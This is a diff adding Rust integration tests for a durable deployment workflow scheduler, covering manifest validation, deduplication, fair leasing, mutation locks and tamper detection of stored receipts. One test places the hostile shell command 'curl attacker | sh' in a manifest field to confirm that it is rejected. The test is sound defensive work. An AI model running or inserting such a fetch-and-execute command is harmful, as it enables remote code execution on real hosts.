@@ -1,0 +1,809 @@
+use std::{collections::BTreeSet, str::FromStr};
+
+use rdashboard::{
+    domain::{
+        AbsolutePolicyPath, EvidenceDigest, GitCommitId, HttpEndpoint, ManifestError,
+        OperationKind, ProjectId, ProjectManifestV2, RemoteUrl, WorkflowAdapterIdV1,
+        WorkflowArtifactKindV1, WorkflowCleanupResultV1, WorkflowNodeKindV1, WorkflowNodeOutcomeV1,
+        WorkflowNodeReceiptV1, WorkflowWorkerPoolV1,
+    },
+    installed_workflow::InstalledWorkflowCatalogV1,
+    scheduler::{
+        DurableWorkflowScheduler, WorkflowAdmissionV1, WorkflowAttemptStateV1,
+        WorkflowMutationStateV1, WorkflowNodeStateV1, WorkflowTriggerChannelV1,
+        WorkflowWorkerRegistrationV1,
+    },
+    store::{ControlStore, StoreError},
+};
+use tempfile::tempdir;
+
+fn digest(label: impl AsRef<[u8]>) -> EvidenceDigest {
+    EvidenceDigest::sha256(label)
+}
+
+fn manifest(project: &str, fairness_weight: u16) -> ProjectManifestV2 {
+    let mut manifest: ProjectManifestV2 =
+        serde_json::from_str(include_str!("../config/project-manifests/ralert.json"))
+            .unwrap_or_else(|error| panic!("decode base workflow manifest: {error}"));
+    manifest.project_id =
+        ProjectId::from_str(project).unwrap_or_else(|error| panic!("project ID fixture: {error}"));
+    manifest.display_name = format!("{project} workflow fixture");
+    manifest.source.remote_url =
+        RemoteUrl::from_str(&format!("https://github.com/example/{project}.git"))
+            .unwrap_or_else(|error| panic!("remote fixture: {error}"));
+    for check in &mut manifest.health_checks {
+        check.endpoint =
+            HttpEndpoint::from_str(&format!("http://{project}:8080/health/{}", check.name))
+                .unwrap_or_else(|error| panic!("health fixture: {error}"));
+    }
+    manifest.data_volumes[0].path =
+        AbsolutePolicyPath::from_str(&format!("/var/lib/{project}/templates"))
+            .unwrap_or_else(|error| panic!("data path fixture: {error}"));
+    manifest.data_volumes[1].path =
+        AbsolutePolicyPath::from_str(&format!("/var/lib/{project}/images"))
+            .unwrap_or_else(|error| panic!("data path fixture: {error}"));
+    manifest.workflow.fairness_weight = fairness_weight;
+    manifest
+        .validate()
+        .unwrap_or_else(|error| panic!("workflow fixture: {error}"));
+    manifest
+}
+
+fn admission(
+    manifest: &ProjectManifestV2,
+    sha_byte: char,
+    sequence: u64,
+    channel: WorkflowTriggerChannelV1,
+    delivery_id: &str,
+) -> WorkflowAdmissionV1 {
+    WorkflowAdmissionV1 {
+        project_id: manifest.project_id.clone(),
+        workflow_policy_digest: manifest
+            .workflow_policy_digest()
+            .unwrap_or_else(|error| panic!("policy digest: {error}")),
+        source_sha: GitCommitId::from_str(&sha_byte.to_string().repeat(40))
+            .unwrap_or_else(|error| panic!("source SHA fixture: {error}")),
+        operation_kind: OperationKind::Deploy,
+        source_sequence: sequence,
+        source_attestation_digest: digest(format!("attestation-{delivery_id}")),
+        trigger_channel: channel,
+        delivery_id: delivery_id.to_owned(),
+        payload_digest: digest(format!("payload-{delivery_id}")),
+        priority: 2,
+    }
+}
+
+fn build_worker() -> WorkflowWorkerRegistrationV1 {
+    WorkflowWorkerRegistrationV1 {
+        worker_id: "vps-build-1".to_owned(),
+        host_id: "vps-1".to_owned(),
+        pools: BTreeSet::from([
+            WorkflowWorkerPoolV1::BuildCompute,
+            WorkflowWorkerPoolV1::VpsRequired,
+        ]),
+    }
+}
+
+fn accelerator_worker() -> WorkflowWorkerRegistrationV1 {
+    WorkflowWorkerRegistrationV1 {
+        worker_id: "i9-optional-1".to_owned(),
+        host_id: "i9-1".to_owned(),
+        pools: BTreeSet::from([WorkflowWorkerPoolV1::BuildCompute]),
+    }
+}
+
+fn executor_worker() -> WorkflowWorkerRegistrationV1 {
+    WorkflowWorkerRegistrationV1 {
+        worker_id: "executor-1".to_owned(),
+        host_id: "vps-1".to_owned(),
+        pools: BTreeSet::from([WorkflowWorkerPoolV1::PrivilegedExecutor]),
+    }
+}
+
+fn success_receipt(
+    lease: &rdashboard::domain::WorkflowLeaseV1,
+    label: &str,
+) -> WorkflowNodeReceiptV1 {
+    WorkflowNodeReceiptV1::new(
+        lease,
+        WorkflowNodeOutcomeV1::Succeeded,
+        Some(digest(format!("output-{label}"))),
+        digest(format!("execution-{label}")),
+        digest(format!("cleanup-{label}")),
+        WorkflowCleanupResultV1::Complete,
+        lease.leased_at_ms + 10,
+    )
+    .unwrap_or_else(|error| panic!("success receipt: {error}"))
+}
+
+fn claim(
+    scheduler: &DurableWorkflowScheduler,
+    worker: &WorkflowWorkerRegistrationV1,
+    now_ms: i64,
+) -> rdashboard::domain::WorkflowLeaseV1 {
+    scheduler
+        .claim_next(worker, now_ms, 1_000)
+        .unwrap_or_else(|error| panic!("claim workflow node: {error}"))
+        .unwrap_or_else(|| panic!("expected a workflow lease"))
+}
+
+fn commit_success(
+    scheduler: &DurableWorkflowScheduler,
+    lease: &rdashboard::domain::WorkflowLeaseV1,
+    label: &str,
+) -> WorkflowNodeReceiptV1 {
+    let receipt = success_receipt(lease, label);
+    scheduler
+        .commit_node_receipt(&receipt, lease.leased_at_ms + 11)
+        .unwrap_or_else(|error| panic!("commit workflow receipt: {error}"));
+    receipt
+}
+
+fn complete_reduction(
+    scheduler: &DurableWorkflowScheduler,
+    start_ms: i64,
+) -> (uuid::Uuid, rdashboard::domain::WorkflowReductionReceiptV1) {
+    let worker = build_worker();
+    let prepare = claim(scheduler, &worker, start_ms);
+    assert_eq!(prepare.node_kind, WorkflowNodeKindV1::HostPrepare);
+    commit_success(scheduler, &prepare, "prepare");
+
+    let build = claim(scheduler, &worker, start_ms + 20);
+    assert_eq!(build.node_kind, WorkflowNodeKindV1::ReleaseBuild);
+    commit_success(scheduler, &build, "release-build");
+
+    let verification = claim(scheduler, &worker, start_ms + 40);
+    assert_eq!(verification.node_kind, WorkflowNodeKindV1::Verification);
+    commit_success(scheduler, &verification, "verification");
+
+    let reduction = scheduler
+        .reduce_attempt(prepare.attempt_id, start_ms + 60)
+        .unwrap_or_else(|error| panic!("reduce required evidence: {error}"));
+    (prepare.attempt_id, reduction)
+}
+
+fn complete_executor_path_to_observation(
+    scheduler: &DurableWorkflowScheduler,
+    start_ms: i64,
+) -> rdashboard::domain::WorkflowLeaseV1 {
+    let expected = [
+        WorkflowNodeKindV1::ResourceReservation,
+        WorkflowNodeKindV1::Backup,
+        WorkflowNodeKindV1::CandidateHealth,
+        WorkflowNodeKindV1::Cutover,
+    ];
+    for (index, kind) in expected.into_iter().enumerate() {
+        let now_ms = start_ms + i64::try_from(index).unwrap_or(0) * 20;
+        let lease = claim(scheduler, &executor_worker(), now_ms);
+        assert_eq!(lease.node_kind, kind);
+        commit_success(scheduler, &lease, &format!("executor-{kind:?}"));
+    }
+    let observation = claim(
+        scheduler,
+        &executor_worker(),
+        start_ms + i64::try_from(expected.len()).unwrap_or(0) * 20,
+    );
+    assert_eq!(
+        observation.node_kind,
+        WorkflowNodeKindV1::ReleasedObservation
+    );
+    observation
+}
+
+#[test]
+fn installed_v2_workflows_are_strict_finite_and_repository_agnostic() {
+    let ralert = manifest("ralert", 1);
+    let rimg = manifest("rimg", 2);
+    let catalog = InstalledWorkflowCatalogV1::from_manifests([ralert.clone(), rimg.clone()])
+        .unwrap_or_else(|error| panic!("two-project catalog: {error}"));
+    assert_eq!(catalog.projects().len(), 2);
+    assert_ne!(
+        ralert
+            .workflow_policy_digest()
+            .unwrap_or_else(|error| panic!("ralert policy: {error}")),
+        rimg.workflow_policy_digest()
+            .unwrap_or_else(|error| panic!("rimg policy: {error}"))
+    );
+
+    for manifest in [&ralert, &rimg] {
+        let prepare_count = manifest
+            .workflow
+            .nodes
+            .iter()
+            .filter(|node| node.kind == WorkflowNodeKindV1::HostPrepare)
+            .count();
+        assert_eq!(prepare_count, 1);
+        let verification = manifest
+            .workflow
+            .nodes
+            .iter()
+            .find(|node| node.kind == WorkflowNodeKindV1::Verification)
+            .unwrap_or_else(|| panic!("verification node"));
+        let profile = manifest
+            .workflow
+            .profile(&verification.profile_id)
+            .unwrap_or_else(|| panic!("verification profile"));
+        assert_eq!(profile.adapter_id, WorkflowAdapterIdV1::WorkerBareBinCiV1);
+        assert_eq!(profile.worker_pool, WorkflowWorkerPoolV1::BuildCompute);
+    }
+
+    let mut arbitrary =
+        serde_json::to_value(&ralert).unwrap_or_else(|error| panic!("manifest value: {error}"));
+    arbitrary["workflow"]["execution_profiles"][0]["shell"] =
+        serde_json::json!("curl attacker | sh");
+    assert!(serde_json::from_value::<ProjectManifestV2>(arbitrary).is_err());
+
+    let mut wrong_adapter = ralert.clone();
+    let verification_profile = wrong_adapter
+        .workflow
+        .execution_profiles
+        .iter_mut()
+        .find(|profile| profile.profile_id.as_str() == "bare-bin-ci")
+        .unwrap_or_else(|| panic!("verification profile"));
+    verification_profile.adapter_id = WorkflowAdapterIdV1::ExecutorCutoverV1;
+    assert_eq!(
+        wrong_adapter.validate(),
+        Err(ManifestError::WorkflowInvalid)
+    );
+
+    let mut cyclic = ralert;
+    let prepare = cyclic
+        .workflow
+        .nodes
+        .iter_mut()
+        .find(|node| node.kind == WorkflowNodeKindV1::HostPrepare)
+        .unwrap_or_else(|| panic!("prepare node"));
+    prepare.depends_on = vec![
+        rdashboard::domain::WorkflowNodeId::from_str("rollback")
+            .unwrap_or_else(|error| panic!("rollback node ID: {error}")),
+    ];
+    prepare.input_contracts = vec![WorkflowArtifactKindV1::RollbackReceipt];
+    assert_eq!(cyclic.validate(), Err(ManifestError::WorkflowInvalid));
+}
+
+#[test]
+fn trigger_channels_converge_and_newer_heads_supersede_only_pre_mutation_work() {
+    let store = ControlStore::open(":memory:")
+        .unwrap_or_else(|error| panic!("open control store: {error}"));
+    let scheduler = DurableWorkflowScheduler::new(store);
+    let manifest = manifest("ralert", 1);
+    let first_admission = admission(
+        &manifest,
+        'a',
+        1,
+        WorkflowTriggerChannelV1::GithubWebhook,
+        "delivery-1",
+    );
+    let first = scheduler
+        .admit(&manifest, &first_admission, 10)
+        .unwrap_or_else(|error| panic!("first admission: {error}"));
+    assert!(first.created());
+
+    let mut duplicate = first_admission.clone();
+    duplicate.trigger_channel = WorkflowTriggerChannelV1::SourceReconciliation;
+    duplicate.delivery_id = "reconcile-1".to_owned();
+    duplicate.payload_digest = digest("reconcile payload");
+    let duplicate = scheduler
+        .admit(&manifest, &duplicate, 11)
+        .unwrap_or_else(|error| panic!("cross-channel duplicate: {error}"));
+    assert!(!duplicate.created());
+    assert_eq!(duplicate.attempt().request_id, first.attempt().request_id);
+
+    let mut conflicting_delivery = first_admission.clone();
+    conflicting_delivery.payload_digest = digest("conflicting payload");
+    assert!(matches!(
+        scheduler.admit(&manifest, &conflicting_delivery, 12),
+        Err(StoreError::WorkflowDeliveryConflict)
+    ));
+
+    let newer = admission(
+        &manifest,
+        'b',
+        2,
+        WorkflowTriggerChannelV1::DirectPush,
+        "direct-2",
+    );
+    let newer = scheduler
+        .admit(&manifest, &newer, 20)
+        .unwrap_or_else(|error| panic!("newer head: {error}"));
+    assert!(newer.created());
+    let superseded = scheduler
+        .attempt(first.attempt().attempt_id)
+        .unwrap_or_else(|error| panic!("load superseded attempt: {error}"))
+        .unwrap_or_else(|| panic!("superseded attempt exists"));
+    assert_eq!(superseded.state, WorkflowAttemptStateV1::Superseded);
+
+    let mut stale = first_admission;
+    stale.delivery_id = "late-old-head".to_owned();
+    stale.payload_digest = digest("late old head");
+    assert!(matches!(
+        scheduler.admit(&manifest, &stale, 21),
+        Err(StoreError::WorkflowStaleSource)
+    ));
+}
+
+#[test]
+fn fair_queue_and_lease_generation_survive_reopen() {
+    let directory = tempdir().unwrap_or_else(|error| panic!("temp dir: {error}"));
+    let path = directory.path().join("control.sqlite");
+    let store =
+        ControlStore::open(&path).unwrap_or_else(|error| panic!("open control store: {error}"));
+    let scheduler = DurableWorkflowScheduler::new(store.clone());
+    let ralert = manifest("ralert", 1);
+    let rimg = manifest("rimg", 1);
+    scheduler
+        .admit(
+            &ralert,
+            &admission(
+                &ralert,
+                'a',
+                1,
+                WorkflowTriggerChannelV1::GithubWebhook,
+                "ralert-1",
+            ),
+            1,
+        )
+        .unwrap_or_else(|error| panic!("admit ralert: {error}"));
+    scheduler
+        .admit(
+            &rimg,
+            &admission(
+                &rimg,
+                'b',
+                1,
+                WorkflowTriggerChannelV1::GithubWebhook,
+                "rimg-1",
+            ),
+            2,
+        )
+        .unwrap_or_else(|error| panic!("admit rimg: {error}"));
+
+    let first = claim(&scheduler, &build_worker(), 10);
+    assert_eq!(first.project_id.as_str(), "ralert");
+    assert_eq!(first.lease_generation, 1);
+    drop(scheduler);
+    drop(store);
+
+    let reopened_store =
+        ControlStore::open(&path).unwrap_or_else(|error| panic!("reopen control store: {error}"));
+    let reopened = DurableWorkflowScheduler::new(reopened_store);
+    let second = claim(&reopened, &build_worker(), 20);
+    assert_eq!(second.project_id.as_str(), "rimg");
+
+    assert_eq!(
+        reopened
+            .expire_leases(first.expires_at_ms)
+            .unwrap_or_else(|error| panic!("expire first lease: {error}")),
+        1
+    );
+    let replayed = claim(&reopened, &build_worker(), first.expires_at_ms + 1);
+    assert_eq!(replayed.project_id.as_str(), "ralert");
+    assert_eq!(replayed.node_id, first.node_id);
+    assert_eq!(replayed.lease_generation, 2);
+}
+
+#[test]
+fn optional_accelerator_can_verify_but_cannot_own_required_preparation_or_release() {
+    let store = ControlStore::open(":memory:")
+        .unwrap_or_else(|error| panic!("open control store: {error}"));
+    let scheduler = DurableWorkflowScheduler::new(store);
+    let manifest = manifest("rimg", 1);
+    scheduler
+        .admit(
+            &manifest,
+            &admission(
+                &manifest,
+                'c',
+                1,
+                WorkflowTriggerChannelV1::GithubWebhook,
+                "rimg-accelerator",
+            ),
+            1,
+        )
+        .unwrap_or_else(|error| panic!("admit workflow: {error}"));
+    assert!(
+        scheduler
+            .claim_next(&accelerator_worker(), 10, 1_000)
+            .unwrap_or_else(|error| panic!("accelerator pre-prepare claim: {error}"))
+            .is_none(),
+        "optional compute cannot own the authoritative prepared run"
+    );
+    let prepare = claim(&scheduler, &build_worker(), 11);
+    assert_eq!(prepare.node_kind, WorkflowNodeKindV1::HostPrepare);
+    assert_eq!(prepare.worker_pool, WorkflowWorkerPoolV1::VpsRequired);
+    assert!(prepare.resources.is_some());
+    commit_success(&scheduler, &prepare, "vps-prepare");
+
+    let verification = claim(&scheduler, &accelerator_worker(), 30);
+    assert_eq!(verification.node_kind, WorkflowNodeKindV1::Verification);
+    assert!(
+        scheduler
+            .claim_next(&accelerator_worker(), 40, 1_000)
+            .unwrap_or_else(|error| panic!("accelerator second claim: {error}"))
+            .is_none(),
+        "VPS-required release build must not be leased to intermittent i9 capacity"
+    );
+}
+
+#[test]
+fn reducer_binds_the_complete_required_set_and_receipts_are_idempotent() {
+    let store = ControlStore::open(":memory:")
+        .unwrap_or_else(|error| panic!("open control store: {error}"));
+    let scheduler = DurableWorkflowScheduler::new(store);
+    let manifest = manifest("ralert", 1);
+    scheduler
+        .admit(
+            &manifest,
+            &admission(
+                &manifest,
+                'd',
+                1,
+                WorkflowTriggerChannelV1::GithubWebhook,
+                "reduce-1",
+            ),
+            1,
+        )
+        .unwrap_or_else(|error| panic!("admit workflow: {error}"));
+
+    let worker = build_worker();
+    let prepare = claim(&scheduler, &worker, 10);
+    let prepare_receipt = success_receipt(&prepare, "prepare-idempotent");
+    let first_commit = scheduler
+        .commit_node_receipt(&prepare_receipt, 21)
+        .unwrap_or_else(|error| panic!("first receipt commit: {error}"));
+    let replay_commit = scheduler
+        .commit_node_receipt(&prepare_receipt, 22)
+        .unwrap_or_else(|error| panic!("receipt replay: {error}"));
+    assert_eq!(first_commit, replay_commit);
+
+    let conflicting = WorkflowNodeReceiptV1::new(
+        &prepare,
+        WorkflowNodeOutcomeV1::Succeeded,
+        Some(digest("different-output")),
+        digest("different-execution"),
+        digest("different-cleanup"),
+        WorkflowCleanupResultV1::Complete,
+        20,
+    )
+    .unwrap_or_else(|error| panic!("conflicting receipt fixture: {error}"));
+    assert!(matches!(
+        scheduler.commit_node_receipt(&conflicting, 23),
+        Err(StoreError::WorkflowReceiptConflict)
+    ));
+
+    let build = claim(&scheduler, &worker, 30);
+    assert_eq!(build.node_kind, WorkflowNodeKindV1::ReleaseBuild);
+    commit_success(&scheduler, &build, "build");
+    let verify = claim(&scheduler, &worker, 50);
+    assert_eq!(verify.node_kind, WorkflowNodeKindV1::Verification);
+    commit_success(&scheduler, &verify, "verify");
+    assert!(matches!(
+        scheduler.reduce_attempt(prepare.attempt_id, 0),
+        Err(StoreError::WorkflowReductionConflict)
+    ));
+    let reduction = scheduler
+        .reduce_attempt(prepare.attempt_id, 70)
+        .unwrap_or_else(|error| panic!("reduce evidence: {error}"));
+    assert_eq!(reduction.inputs.len(), 2);
+    assert_eq!(
+        reduction
+            .inputs
+            .iter()
+            .map(|input| input.node_kind)
+            .collect::<BTreeSet<_>>(),
+        BTreeSet::from([
+            WorkflowNodeKindV1::Verification,
+            WorkflowNodeKindV1::ReleaseBuild,
+        ])
+    );
+    let replayed = scheduler
+        .reduce_attempt(prepare.attempt_id, 999)
+        .unwrap_or_else(|error| panic!("replay reduction: {error}"));
+    assert_eq!(replayed, reduction);
+}
+
+#[test]
+fn late_receipts_requeue_non_mutating_work_instead_of_becoming_success() {
+    let store = ControlStore::open(":memory:")
+        .unwrap_or_else(|error| panic!("open control store: {error}"));
+    let scheduler = DurableWorkflowScheduler::new(store);
+    let manifest = manifest("ralert", 1);
+    scheduler
+        .admit(
+            &manifest,
+            &admission(
+                &manifest,
+                'e',
+                1,
+                WorkflowTriggerChannelV1::GithubWebhook,
+                "late-1",
+            ),
+            1,
+        )
+        .unwrap_or_else(|error| panic!("admit workflow: {error}"));
+    let lease = claim(&scheduler, &build_worker(), 10);
+    let receipt = success_receipt(&lease, "late");
+    assert!(matches!(
+        scheduler.commit_node_receipt(&receipt, lease.expires_at_ms),
+        Err(StoreError::WorkflowLeaseConflict)
+    ));
+    let attempt = scheduler
+        .attempt(lease.attempt_id)
+        .unwrap_or_else(|error| panic!("load expired attempt: {error}"))
+        .unwrap_or_else(|| panic!("expired attempt exists"));
+    let node = attempt
+        .nodes
+        .iter()
+        .find(|node| node.node_id == lease.node_id)
+        .unwrap_or_else(|| panic!("expired node exists"));
+    assert_eq!(node.state, WorkflowNodeStateV1::Ready);
+    assert!(node.output_digest.is_none());
+}
+
+#[test]
+fn mutation_owner_survives_newer_head_and_expiry_requires_reconciliation() {
+    let store = ControlStore::open(":memory:")
+        .unwrap_or_else(|error| panic!("open control store: {error}"));
+    let scheduler = DurableWorkflowScheduler::new(store);
+    let manifest = manifest("ralert", 1);
+    scheduler
+        .admit(
+            &manifest,
+            &admission(
+                &manifest,
+                'a',
+                1,
+                WorkflowTriggerChannelV1::GithubWebhook,
+                "mutation-1",
+            ),
+            1,
+        )
+        .unwrap_or_else(|error| panic!("admit first workflow: {error}"));
+    let (attempt_id, _) = complete_reduction(&scheduler, 10);
+    let reserve = claim(&scheduler, &executor_worker(), 100);
+    assert_eq!(reserve.node_kind, WorkflowNodeKindV1::ResourceReservation);
+    commit_success(&scheduler, &reserve, "reserve");
+    let backup = claim(&scheduler, &executor_worker(), 120);
+    assert_eq!(backup.node_kind, WorkflowNodeKindV1::Backup);
+
+    let newer = admission(
+        &manifest,
+        'b',
+        2,
+        WorkflowTriggerChannelV1::GithubWebhook,
+        "mutation-2",
+    );
+    let newer = scheduler
+        .admit(&manifest, &newer, 130)
+        .unwrap_or_else(|error| panic!("admit newer workflow: {error}"));
+    assert_eq!(
+        newer.attempt().state,
+        WorkflowAttemptStateV1::WaitingForMutation
+    );
+    let active = scheduler
+        .attempt(attempt_id)
+        .unwrap_or_else(|error| panic!("load mutation owner: {error}"))
+        .unwrap_or_else(|| panic!("mutation owner exists"));
+    assert_eq!(active.state, WorkflowAttemptStateV1::Running);
+    assert_eq!(active.mutation_state, WorkflowMutationStateV1::Owned);
+
+    assert_eq!(
+        scheduler
+            .expire_leases(backup.expires_at_ms)
+            .unwrap_or_else(|error| panic!("expire mutation lease: {error}")),
+        1
+    );
+    let ambiguous = scheduler
+        .attempt(attempt_id)
+        .unwrap_or_else(|error| panic!("load ambiguous attempt: {error}"))
+        .unwrap_or_else(|| panic!("ambiguous attempt exists"));
+    assert_eq!(ambiguous.state, WorkflowAttemptStateV1::NeedsReconcile);
+    assert_eq!(
+        ambiguous.mutation_state,
+        WorkflowMutationStateV1::NeedsReconcile
+    );
+    assert_eq!(
+        scheduler
+            .attempt(newer.attempt().attempt_id)
+            .unwrap_or_else(|error| panic!("load waiting attempt: {error}"))
+            .unwrap_or_else(|| panic!("waiting attempt exists"))
+            .state,
+        WorkflowAttemptStateV1::WaitingForMutation
+    );
+    assert!(
+        scheduler
+            .claim_next(&executor_worker(), backup.expires_at_ms + 1, 1_000)
+            .unwrap_or_else(|error| panic!("claim behind reconcile lock: {error}"))
+            .is_none()
+    );
+}
+
+#[test]
+fn terminal_success_releases_mutation_ownership_and_wakes_the_newer_head() {
+    let store = ControlStore::open(":memory:")
+        .unwrap_or_else(|error| panic!("open control store: {error}"));
+    let scheduler = DurableWorkflowScheduler::new(store);
+    let manifest = manifest("ralert", 1);
+    scheduler
+        .admit(
+            &manifest,
+            &admission(
+                &manifest,
+                '1',
+                1,
+                WorkflowTriggerChannelV1::GithubWebhook,
+                "terminal-success-1",
+            ),
+            1,
+        )
+        .unwrap_or_else(|error| panic!("admit first workflow: {error}"));
+    let (attempt_id, _) = complete_reduction(&scheduler, 10);
+    let observation = complete_executor_path_to_observation(&scheduler, 100);
+
+    let newer = scheduler
+        .admit(
+            &manifest,
+            &admission(
+                &manifest,
+                '2',
+                2,
+                WorkflowTriggerChannelV1::GithubWebhook,
+                "terminal-success-2",
+            ),
+            181,
+        )
+        .unwrap_or_else(|error| panic!("admit waiting workflow: {error}"));
+    assert_eq!(
+        newer.attempt().state,
+        WorkflowAttemptStateV1::WaitingForMutation
+    );
+
+    commit_success(&scheduler, &observation, "released-observation");
+    let completed = scheduler
+        .attempt(attempt_id)
+        .unwrap_or_else(|error| panic!("load completed workflow: {error}"))
+        .unwrap_or_else(|| panic!("completed workflow exists"));
+    assert_eq!(completed.state, WorkflowAttemptStateV1::Succeeded);
+    assert_eq!(completed.mutation_state, WorkflowMutationStateV1::Complete);
+    assert_eq!(
+        completed
+            .nodes
+            .iter()
+            .find(|node| node.kind == WorkflowNodeKindV1::Rollback)
+            .unwrap_or_else(|| panic!("rollback node exists"))
+            .state,
+        WorkflowNodeStateV1::Cancelled
+    );
+
+    let woken = scheduler
+        .attempt(newer.attempt().attempt_id)
+        .unwrap_or_else(|error| panic!("load woken workflow: {error}"))
+        .unwrap_or_else(|| panic!("woken workflow exists"));
+    assert_eq!(woken.state, WorkflowAttemptStateV1::Queued);
+    let preparation = claim(&scheduler, &build_worker(), 200);
+    assert_eq!(preparation.attempt_id, woken.attempt_id);
+    assert_eq!(preparation.node_kind, WorkflowNodeKindV1::HostPrepare);
+}
+
+#[test]
+fn terminal_success_rolls_back_when_the_held_mutation_lock_is_missing() {
+    let directory = tempdir().unwrap_or_else(|error| panic!("temp dir: {error}"));
+    let path = directory.path().join("missing-mutation-lock.sqlite");
+    let store =
+        ControlStore::open(&path).unwrap_or_else(|error| panic!("open control store: {error}"));
+    let scheduler = DurableWorkflowScheduler::new(store.clone());
+    let manifest = manifest("ralert", 1);
+    scheduler
+        .admit(
+            &manifest,
+            &admission(
+                &manifest,
+                '3',
+                1,
+                WorkflowTriggerChannelV1::GithubWebhook,
+                "missing-lock-1",
+            ),
+            1,
+        )
+        .unwrap_or_else(|error| panic!("admit workflow: {error}"));
+    complete_reduction(&scheduler, 10);
+    let observation = complete_executor_path_to_observation(&scheduler, 100);
+    let observation_receipt = success_receipt(&observation, "missing-lock-observation");
+    drop(scheduler);
+    drop(store);
+
+    let raw = rusqlite::Connection::open(&path)
+        .unwrap_or_else(|error| panic!("open raw control store: {error}"));
+    assert_eq!(
+        raw.execute(
+            "DELETE FROM workflow_mutation_locks WHERE attempt_id = ?1",
+            [observation.attempt_id.to_string()],
+        )
+        .unwrap_or_else(|error| panic!("remove mutation lock fixture: {error}")),
+        1
+    );
+    drop(raw);
+
+    let reopened = DurableWorkflowScheduler::new(
+        ControlStore::open(&path).unwrap_or_else(|error| panic!("reopen control store: {error}")),
+    );
+    assert!(matches!(
+        reopened.commit_node_receipt(&observation_receipt, 191),
+        Err(StoreError::CorruptWorkflowJournal(
+            "completed mutation without held project lock"
+        ))
+    ));
+    let unchanged = reopened
+        .attempt(observation.attempt_id)
+        .unwrap_or_else(|error| panic!("load rolled-back workflow: {error}"))
+        .unwrap_or_else(|| panic!("rolled-back workflow exists"));
+    assert_eq!(unchanged.state, WorkflowAttemptStateV1::Running);
+    assert_eq!(
+        unchanged
+            .nodes
+            .iter()
+            .find(|node| node.node_id == observation.node_id)
+            .unwrap_or_else(|| panic!("observation node exists"))
+            .state,
+        WorkflowNodeStateV1::Leased
+    );
+}
+
+#[test]
+fn persisted_reduction_revalidates_its_source_receipts_after_restart() {
+    let directory = tempdir().unwrap_or_else(|error| panic!("temp dir: {error}"));
+    let path = directory.path().join("tampered-control.sqlite");
+    let store =
+        ControlStore::open(&path).unwrap_or_else(|error| panic!("open control store: {error}"));
+    let scheduler = DurableWorkflowScheduler::new(store.clone());
+    let manifest = manifest("ralert", 1);
+    scheduler
+        .admit(
+            &manifest,
+            &admission(
+                &manifest,
+                'f',
+                1,
+                WorkflowTriggerChannelV1::GithubWebhook,
+                "tamper-1",
+            ),
+            1,
+        )
+        .unwrap_or_else(|error| panic!("admit workflow: {error}"));
+
+    let worker = build_worker();
+    let prepare = claim(&scheduler, &worker, 10);
+    commit_success(&scheduler, &prepare, "tamper-prepare");
+    let build = claim(&scheduler, &worker, 30);
+    commit_success(&scheduler, &build, "tamper-build");
+    let verify = claim(&scheduler, &worker, 50);
+    commit_success(&scheduler, &verify, "tamper-verify");
+    let attempt_id = prepare.attempt_id;
+    scheduler
+        .reduce_attempt(attempt_id, 70)
+        .unwrap_or_else(|error| panic!("persist reduction before restart: {error}"));
+    drop(scheduler);
+    drop(store);
+
+    let raw = rusqlite::Connection::open(&path)
+        .unwrap_or_else(|error| panic!("open raw control store: {error}"));
+    let changed = raw
+        .execute(
+            "UPDATE workflow_node_receipts
+             SET receipt_json = replace(receipt_json, '\"host_id\":\"vps-1\"',
+                 '\"host_id\":\"evil-1\"')
+             WHERE attempt_id = ?1 AND node_id = 'verify'",
+            [attempt_id.to_string()],
+        )
+        .unwrap_or_else(|error| panic!("tamper receipt: {error}"));
+    assert_eq!(changed, 1);
+    drop(raw);
+
+    let reopened = DurableWorkflowScheduler::new(
+        ControlStore::open(&path).unwrap_or_else(|error| panic!("reopen control store: {error}")),
+    );
+    assert!(matches!(
+        reopened.reduce_attempt(attempt_id, 70),
+        Err(StoreError::WorkflowContract(_))
+    ));
+}
